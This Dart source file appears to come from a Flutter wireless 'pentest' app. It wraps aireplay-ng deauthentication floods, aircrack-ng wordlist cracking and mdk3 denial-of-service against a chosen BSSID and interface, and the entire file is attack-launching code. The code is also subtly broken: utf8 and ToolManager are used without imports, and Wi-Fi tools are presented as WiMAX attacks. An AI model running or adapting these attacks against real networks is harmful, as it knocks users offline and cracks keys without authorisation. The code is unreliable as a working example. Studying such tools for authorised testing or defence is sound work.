import 'dart:io';
import 'package:wimax_pentest_flutter/models/attack_result.dart';

class AttackExecutor {
  static Future<AttackResult> runCommand({
    required String command,
    required List<String> args,
    String? input,
  }) async {
    try {
      final process = await Process.start(command, args);
      
      if (input != null) {
        process.stdin.writeln(input);
        await process.stdin.flush();
        await process.stdin.close();
      }
      
      final stdout = await process.stdout.transform(utf8.decoder).join();
      final stderr = await process.stderr.transform(utf8.decoder).join();
      final exitCode = await process.exitCode;
      
      return AttackResult(
        success: exitCode == 0,
        output: stdout,
        error: stderr,
      );
    } catch (e) {
      return AttackResult(
        success: false,
        error: e.toString(),
      );
    }
  }

  static Future<AttackResult> launchWimaxAttack({
    required String attackType,
    required String interface,
    String? bssid,
    String? wordlist,
  }) async {
    final toolPath = await ToolManager.getToolPath(_getToolName(attackType));
    final args = _buildArgs(attackType, interface, bssid, wordlist);
    
    return await runCommand(
      command: toolPath,
      args: args,
    );
  }

  static String _getToolName(String attackType) {
    return switch (attackType) {
      'deauth' => 'aireplay-ng',
      'bruteforce' => 'aircrack-ng',
      'dos' => 'mdk3',
      _ => throw Exception('Unknown attack type'),
    };
  }

  static List<String> _buildArgs(
    String attackType,
    String interface,
    String? bssid,
    String? wordlist,
  ) {
    switch (attackType) {
      case 'deauth':
        return ['--deauth', '10', '-a', bssid!, interface];
      case 'bruteforce':
        return ['-w', wordlist!, '-b', bssid!, '-l', 'result.txt'];
      case 'dos':
        return [interface, 'd'];
      default:
        throw Exception('Invalid attack type');
    }
  }
}